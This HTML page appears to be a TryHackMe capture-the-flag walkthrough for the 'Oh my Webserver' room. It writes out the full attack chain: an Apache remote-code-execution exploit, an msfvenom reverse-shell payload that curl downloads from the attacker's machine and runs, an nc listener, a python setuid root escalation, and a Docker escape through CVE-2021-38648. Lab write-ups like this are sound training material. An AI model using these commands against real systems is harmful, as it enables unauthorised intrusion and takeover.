<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>oh my webserver</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>oh my webserver</h1><br/><p><strong><h1>THM: Oh my Webserver</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong><h4>Nmap Scanning</h4></strong></p><p></p><p><img src="images/70-1.png" alt="images/70-1.png" /></p><p></p><p><strong><h4>Website Enumeration</h4></strong></p><p><strong><h5>Browser</h5></strong></p><p><img src="images/70-2.png" alt="images/70-2.png" /></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>We search for vulnerabiliteis of the Apache version.</p><p></p><p><img src="images/70-3.png" alt="images/70-3.png" /></p><p></p><p></p><p>We will use the same to get access the server.</p><p></p><p><img src="images/70-4.png" alt="images/70-4.png" /></p><p></p><p>Thus, we confirm we have Remote Code Execution on the server. We can use this to get a reverse shell connection to our Kali machine.</p><p></p><p>We have only a place holder inside single quotes to give commands, so complex reverse shell commands will not work. We used msfvenom to create a linux tcp_shell executible that would connect to my kali machines IP on port 8888.</p><p></p><p><em>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.17.5.85 LPORT=8888 -f elf -o tcp_shell</em></p><p></p><p>Then, we host this tcp_shell executible in our local kali machine&#39;s python webserver.</p><p></p><p><em>python3 -m http.server 80</em></p><p></p><p><img src="images/70-5.png" alt="images/70-5.png" /></p><p></p><p></p><p>Next, we use the following payload in our shell script exploit.</p><p></p><p>We first checked if curl was installed or not.</p><p>Then, we downloaded our hosted file &amp; saved it in /tmp folder &amp; finally viewed to verify the process.</p><p></p><p><em>./50383.sh targets.txt /bin/sh &#39;curl -L http://10.17.5.85/tcp_shell -o /tmp/shell; ls /tmp&#39;</em></p><p></p><p><img src="images/70-6.png" alt="images/70-6.png" /></p><p></p><p>We start a reverse shell listener on port 8888</p><p></p><p><em>rlwrap nc -lvnp 8888</em></p><p></p><p>Finally, we execute the shell to get reverse connection.</p><p></p><p><em>./50383.sh targets.txt /bin/sh &#39;chmod +x /tmp/shell;/tmp/shell&#39; </em></p><p></p><p><img src="images/70-7.png" alt="images/70-7.png" /></p><p></p><p>We got initial access to the server.</p><p></p><p><img src="images/70-8.png" alt="images/70-8.png" /></p><p></p><p>Examining further in the server we see that we might be inside a docker environment, seeing the IP.</p><p></p><p><img src="images/70-9.png" alt="images/70-9.png" /></p><p></p><p>We need to elevate our user privilege from <strong>daemon</strong> user. We checked /etc/passwd file, there are no other users. We need to elevate ourselves to the docker root user.</p><p></p><p><strong><h3>Docker Privilege Escalation</h3></strong></p><p></p><p>We checked for capabilites and found the following. We will exploit it to get root.</p><p></p><p><em>getcap -r / 2&gt;dev/null</em></p><p></p><p><img src="images/70-10.png" alt="images/70-10.png" /></p><p></p><p>Thus, python binary has the setuid capability enabled.</p><p></p><p><em>python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</em></p><p></p><p><img src="images/70-11.png" alt="images/70-11.png" /></p><p></p><p>We can get the user flag in the root directory.</p><p></p><p><img src="images/70-12.png" alt="images/70-12.png" /></p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p><strong><h3>Escaping the docker environment</h3></strong></p><p></p><p>Now, we are a root user of the docker. By checking the ipconfig we came to conclusion that the main server might also be connected to the docker environment say 172.17.0.1</p><p></p><p>To test this hypothesis, we get nmap static binary from the following &amp; send it to the server using python webserver.</p><p></p><p><strong>https://gitlab.com/pentest-tools/static-binaries/-/blob/master/binaries/linux/x86_64/nmap?ref_type=heads</strong></p><p></p><p>Then, we run the namp binary in the target machine.</p><p></p><p><em>curl -L http://10.17.5.85/nmap -o nmap</em></p><p><em>chmod +x nmap</em></p><p><em>./nmap -sn 172.17.0.0/24</em></p><p></p><p><img src="images/70-13.png" alt="images/70-13.png" /></p><p></p><p></p><p>We will run scans on the target now.</p><p></p><p><em>./nmap -sT -T4 -p- 172.17.0.1</em></p><p></p><p><img src="images/70-14.png" alt="images/70-14.png" /></p><p></p><p>We searched for <em>“port 5986 service exploit”</em> in google &amp; found the following exploit link.</p><p></p><p><strong>https://github.com/CyberMonitor/CVE-2021-38648</strong></p><p></p><p>We got the python code &amp; ran it as recommended. We uploaded the python code using python webserver. Then ran the python code from the docker mahcine to get RCE inside the main server as root. Thus breaking out of the docker environment.</p><p></p><p><img src="images/70-15.png" alt="images/70-15.png" /></p><p></p><p>Thanks !!</p></div>
</body>
</html>
